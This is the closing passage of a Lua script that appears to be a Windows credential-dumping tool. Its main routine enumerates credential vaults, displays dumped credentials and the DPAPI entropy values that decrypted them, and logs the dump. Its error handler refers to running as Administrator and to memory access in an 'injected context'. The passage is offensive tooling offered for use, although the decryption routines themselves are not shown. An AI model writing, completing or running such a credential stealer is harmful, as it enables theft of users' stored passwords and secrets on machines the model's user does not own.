    local vaults = enumerate_vaults()
    
    -- Display results
    display_credentials(credentials)
    display_vaults(vaults)
    
    -- Display successful entropy values
    display_successful_entropy()
    
    log(string.format("\n[*] Dump completed successfully"))
    log(string.format("[*] Log file saved to: %s", LOG_PATH))
    
    print(string.format("\n[*] Log file saved to: %s", LOG_PATH))
    
    -- Close log file
    close_logging()
end

-- Execute with robust error handling
local status, err = pcall(main)

if not status then
    local err_msg = tostring(err)
    print(string.format("\n[!] Critical Error: %s", err_msg))
    print("[!] This may be due to:")
    print("    - Insufficient privileges (try running as Administrator)")
    print("    - Wrong entropy value for DPAPI decryption")
    print("    - Memory access violations in injected context")
    
    if LOG_FILE then
        pcall(function()
            LOG_FILE:write(string.format("\n[ERROR] %s\n", err_msg))
            LOG_FILE:close()
        end)
    end
end
